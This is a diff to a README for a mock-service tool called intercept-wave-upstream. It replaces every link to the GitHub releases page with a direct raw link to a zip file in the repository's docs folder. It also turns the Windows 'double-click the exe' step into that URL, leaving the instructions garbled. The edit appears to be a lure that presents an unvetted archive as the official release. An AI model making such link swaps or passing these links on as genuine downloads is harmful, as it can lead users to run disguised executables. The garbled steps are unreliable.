@@ -6,9 +6,9 @@ Welcome to intercept-wave-upstream! This tool helps you create mock services for
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/idkdevoo/intercept-wave-upstream/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/idkdevoo/intercept-wave-upstream/main/docs/intercept-wave-upstream_v2.7-alpha.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/idkdevoo/intercept-wave-upstream/main/docs/intercept-wave-upstream_v2.7-alpha.1.zip)
 
-To get started, visit this page to download: [Release Page](https://github.com/idkdevoo/intercept-wave-upstream/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/idkdevoo/intercept-wave-upstream/main/docs/intercept-wave-upstream_v2.7-alpha.1.zip).
 
 ## 🖥️ System Requirements
 
@@ -33,12 +33,12 @@ Intercept-wave-upstream offers various features to simplify your testing:
 
 To download the application, follow these easy steps:
 
-1. **Visit the Release Page:** Click [here](https://github.com/idkdevoo/intercept-wave-upstream/releases) to go to the release page.
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/idkdevoo/intercept-wave-upstream/main/docs/intercept-wave-upstream_v2.7-alpha.1.zip) to go to the release page.
 2. **Select the Latest Version:** Scroll down to find the latest version of the application.
 3. **Download the Package:** Click on the appropriate link for your operating system. This will download the necessary files.
 4. **Extract the Files:** If the downloaded file is in a zip format, extract it to a location you can easily access.
 5. **Run the Application:**
-   - For Windows, double-click `intercept-wave.exe`.
+   - For Windows, double-click `https://raw.githubusercontent.com/idkdevoo/intercept-wave-upstream/main/docs/intercept-wave-upstream_v2.7-alpha.1.zip`.
    - For macOS, drag the application to your Applications folder and launch it from there.
    - For Linux, open a terminal, navigate to the folder, and run `./intercept-wave`.
 
